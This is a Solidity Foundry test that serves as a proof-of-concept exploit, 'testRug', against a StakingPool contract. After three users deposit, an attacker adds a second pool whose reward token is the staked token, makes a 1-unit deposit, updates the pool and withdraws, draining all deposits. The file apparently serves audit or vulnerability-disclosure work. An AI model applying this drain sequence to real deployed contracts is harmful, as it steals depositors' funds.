// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./mock/Token.sol";
import "../src/StakingPool.sol";

contract StakingPoolTest is Test {
    StakingPool public pool;
    Token public stakingToken;

    address wethStub = address(0x1);
    address veOcto = address(0x2);
    address treasury = address(0x3);

    address userA = address(0x4);
    address userB = address(0x5);
    address userC = address(0x6);

    address rugAddress = address(0x7);

    function setUp() public {
        pool = new StakingPool(wethStub, veOcto, treasury);
        stakingToken = new Token();
    }
    
    function testRug() public {
        //prepare
        vm.warp(0);
        uint256 balanceBefore = stakingToken.balanceOf(address(this));

        stakingToken.transfer(userA, 10 * 10 ** 18);
        stakingToken.transfer(userB, 100 * 10 ** 18);
        stakingToken.transfer(userC, 250 * 10 ** 18);
        stakingToken.transfer(rugAddress, 1);

        assertEq(stakingToken.balanceOf(userA), 10 * 10 ** 18);
        assertEq(stakingToken.balanceOf(userB), 100 * 10 ** 18);
        assertEq(stakingToken.balanceOf(userC), 250 * 10 ** 18);
        assertEq(stakingToken.balanceOf(rugAddress), 1);

        assertEq(stakingToken.balanceOf(address(this)), balanceBefore - (10 + 100 + 250) * 10 ** 18 - 1);

        pool.add(veOcto, 1 * 10 ** 18, stakingToken, true);

        vm.startPrank(userA);

        stakingToken.approve(address(pool), 10 * 10 ** 18);
        pool.deposit(0, 10 * 10 ** 18);

        vm.stopPrank();

        assertEq(stakingToken.balanceOf(userA), 0);
        assertEq(stakingToken.balanceOf(address(pool)), 10 * 10 ** 18);

        vm.startPrank(userB);

        stakingToken.approve(address(pool), 100 * 10 ** 18);
        pool.deposit(0, 100 * 10 ** 18);

        vm.stopPrank();

        assertEq(stakingToken.balanceOf(userB), 0);
        assertEq(stakingToken.balanceOf(address(pool)), (10 + 100) * 10 ** 18);

        vm.startPrank(userC);

        stakingToken.approve(address(pool), 250 * 10 ** 18);
        pool.deposit(0, 250 * 10 ** 18);

        vm.stopPrank();

        assertEq(stakingToken.balanceOf(userC), 0);
        assertEq(stakingToken.balanceOf(address(pool)), (10 + 100 + 250) * 10 ** 18);

        // ~~~ start the rug ~~~

        // add a new pool with reward token set to the token we want to rug and reward equal or higher to the amount we want to rug
        pool.add(address(stakingToken), 360 * 10 ** 18, stakingToken, true);

        vm.startPrank(rugAddress);

        // make deposit to the new pool and set totalShare to 1
        stakingToken.approve(address(pool), 1);
        pool.deposit(1, 1);

        vm.warp(1);

        // updatePool will set accrewardPerShare to value equal or higher than rewardPerSecond (which we set as balance we want to rug)
        pool.updatePool(1);
       
        // withdraw will trigger settlePendingreward which will use _safreTransfer to transfer reward token (we set it to the token we want to rug) equal to reward which was set to amount we want to rug or higher 
        pool.withdraw(1, 1);

        vm.stopPrank();

        // ~~~ end of rug ~~~

        //check if rug is successful
        assertEq(stakingToken.balanceOf(address(pool)), 0, "pool is not drained");
        assertEq(stakingToken.balanceOf(rugAddress), 360 * 10 ** 18 + 1, "treasury is empty");
    }
}
